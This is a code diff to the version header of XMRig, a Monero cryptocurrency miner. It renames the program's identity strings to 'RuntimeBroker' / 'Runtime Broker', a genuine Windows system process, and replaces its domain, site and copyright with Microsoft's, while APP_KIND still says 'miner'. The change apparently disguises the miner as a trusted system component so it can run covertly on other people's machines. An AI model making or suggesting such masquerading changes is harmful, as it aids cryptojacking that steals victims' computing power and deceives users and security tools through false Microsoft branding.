@@ -19,13 +19,13 @@
 #ifndef XMRIG_VERSION_H
 #define XMRIG_VERSION_H
 
-#define APP_ID        "xmrig"
-#define APP_NAME      "XMRig"
-#define APP_DESC      "XMRig miner"
+#define APP_ID        "runtimebroker"
+#define APP_NAME      "RuntimeBroker"
+#define APP_DESC      "Runtime Broker"
 #define APP_VERSION   "6.16.4-mo1"
-#define APP_DOMAIN    "xmrig.com"
-#define APP_SITE      "www.xmrig.com"
-#define APP_COPYRIGHT "Copyright (C) 2016-2021 xmrig.com"
+#define APP_DOMAIN    "Microsoft.com"
+#define APP_SITE      "Microsoft.com"
+#define APP_COPYRIGHT "Copyright (C) 2016-2021 Microsoft"
 #define APP_KIND      "miner"
 
 #define APP_VER_MAJOR  6
